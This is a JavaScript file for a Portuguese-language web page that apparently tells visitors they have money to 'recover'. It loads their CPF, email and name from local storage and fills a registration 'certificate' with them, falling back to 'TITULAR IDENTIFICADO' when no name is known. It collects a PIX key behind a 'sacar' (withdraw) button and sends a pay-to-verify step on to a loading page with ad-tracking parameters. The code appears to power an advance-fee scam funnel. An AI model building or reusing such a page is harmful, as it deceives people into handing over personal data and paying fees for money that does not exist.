document.addEventListener('DOMContentLoaded', async () => {
  const cpf = localStorage.getItem('recupera_cpf');
  const email = localStorage.getItem('recupera_email');
  
  const loadingApi = document.getElementById('loadingApi');
  const resultContent = document.getElementById('resultContent');
  const userNameEl = document.getElementById('userName');

  const sacarBtn = document.getElementById('sacarBtn');
  const resultModal = document.getElementById('resultModal');
  const closeModalBtn = document.getElementById('closeModalBtn');
  
  const stepVerification = document.getElementById('stepVerification');
  const verifyName = document.getElementById('verifyName');
  const verifyCpf = document.getElementById('verifyCpf');
  const verifyPayBtn = document.getElementById('verifyPayBtn');
  
  const stepPixPayment = document.getElementById('stepPixPayment');
  const pixGeneratingSpinner = document.getElementById('pixGeneratingSpinner');
  const pixQrCodeImage = document.getElementById('pixQrCodeImage');
  const pixCopiaColaInput = document.getElementById('pixCopiaColaInput');
  const pixStatusMsg = document.getElementById('pixStatusMsg');
  const btnCopiarPix = document.getElementById('btnCopiarPix');
  const btnCopiarText = document.getElementById('btnCopiarText');

  // Lê o nome já consultado pelo loading.html (já está no localStorage)
  const fetchedName = localStorage.getItem('recupera_nome') || '';
  const cpfFormatado = localStorage.getItem('recupera_cpf_formatted') || cpf || '';

  // Atualizar UI imediatamente — sem esperar API
  if (fetchedName) {
    userNameEl.textContent = fetchedName;
    verifyName.textContent = fetchedName;
  } else {
    userNameEl.textContent = 'TITULAR IDENTIFICADO';
    verifyName.textContent = 'TITULAR IDENTIFICADO';
  }
  verifyCpf.textContent = cpfFormatado;

  // Preencher os campos do Certificado de Registro
  const docNomeEl = document.getElementById('docNome');
  const docCpfEl = document.getElementById('docCpf');
  
  let formattedDocName = fetchedName || 'TITULAR IDENTIFICADO';
  
  if (docNomeEl) {
    docNomeEl.textContent = formattedDocName;
    if (formattedDocName !== 'TITULAR IDENTIFICADO' && formattedDocName.length > 33) {
      docNomeEl.style.setProperty('font-size', 'clamp(6px, 1.8vw, 9px)', 'important');
      docNomeEl.style.setProperty('left', '4%', 'important');
      docNomeEl.style.setProperty('top', '34.7%', 'important');
    }
  }
  
  if (docCpfEl) docCpfEl.textContent = cpfFormatado;

  // 3. Lógica do Modal
  sacarBtn.addEventListener('click', () => {
    resultModal.classList.add('active');
  });

  closeModalBtn.addEventListener('click', () => {
    resultModal.classList.remove('active');
  });

  // 4. Validação da Chave PIX
  const pixKeyType = document.getElementById('pixKeyType');
  const pixKeyValue = document.getElementById('pixKeyValue');
  const pixErrorMsg = document.getElementById('pixErrorMsg');

  function validatePixKey() {
    if (!pixKeyType || !pixKeyValue || !pixErrorMsg || !verifyPayBtn) return;
    
    const type = pixKeyType.value;
    const value = pixKeyValue.value.trim();
    let isValid = false;
    let errorMsg = '';

    if (value === '') {
      isValid = false;
    } else if (type === 'email') {
      if (!value.includes('@') || !value.includes('.')) {
        errorMsg = 'E-mail inválido. Deve conter @ e um domínio (.com, etc).';
      } else {
        isValid = true;
      }
    } else if (type === 'cpf') {
      const numbers = value.replace(/\D/g, '');
      if (numbers.length !== 11) {
        errorMsg = 'CPF inválido. Deve conter exatamente 11 dígitos.';
      } else {
        isValid = true;
      }
    } else if (type === 'celular') {
      const numbers = value.replace(/\D/g, '');
      if (numbers.length < 10 || numbers.length > 11) {
        errorMsg = 'Celular inválido. Deve conter DDD + número.';
      } else {
        isValid = true;
      }
    } else if (type === 'aleatoria') {
      if (value.length < 15) {
        errorMsg = 'Chave aleatória inválida. Verifique os caracteres.';
      } else {
        isValid = true;
      }
    }

    if (isValid) {
      pixErrorMsg.style.display = 'none';
      verifyPayBtn.disabled = false;
    } else {
      if (errorMsg) {
        pixErrorMsg.textContent = errorMsg;
        pixErrorMsg.style.display = 'block';
      } else {
        pixErrorMsg.style.display = 'none';
      }
      verifyPayBtn.disabled = true;
    }
  }

  if (pixKeyValue) {
    pixKeyValue.addEventListener('input', (e) => {
      const type = pixKeyType.value;
      // Restringe a digitação para apenas números no CPF e Celular
      if (type === 'cpf' || type === 'celular') {
        let onlyNumbers = e.target.value.replace(/\D/g, '');
        if (type === 'cpf') {
          onlyNumbers = onlyNumbers.substring(0, 11); // Max 11 dígitos para CPF
        } else if (type === 'celular') {
          onlyNumbers = onlyNumbers.substring(0, 11); // Max 11 dígitos para Celular
        }
        e.target.value = onlyNumbers;
      }
      validatePixKey();
    });
  }
  if (pixKeyType) {
    pixKeyType.addEventListener('change', () => {
      pixKeyValue.value = ''; // Limpa ao trocar de tipo
      validatePixKey();
    });
  }

  // 5. Lógica de Geração do PIX (FlevoPay)
  verifyPayBtn.addEventListener('click', () => {
    if (pixKeyValue && pixKeyValue.value) {
      localStorage.setItem('recupera_chave_pix', pixKeyValue.value.trim());
      if (pixKeyType && pixKeyType.options.length > 0) {
        localStorage.setItem('recupera_tipo_chave_pix', pixKeyType.options[pixKeyType.selectedIndex].text);
      }
    }
    // Redireciona para a página de loading da página 3 repassando UTMs/ttclid
    var params = window.location.search;
    window.location.href = 'pagina3_loading.html' + (params ? params : '');
  });

  // Copiar PIX
  if(btnCopiarPix) btnCopiarPix.addEventListener('click', () => {
    if (!pixCopiaColaInput.value) return;
    pixCopiaColaInput.select();
    navigator.clipboard.writeText(pixCopiaColaInput.value).then(() => {
      btnCopiarText.textContent = '✓ CÓDIGO PIX COPIADO!';
      setTimeout(() => {
        btnCopiarText.textContent = 'COPIAR PIX COPIA E COLA';
      }, 3000);
    });
  });

});
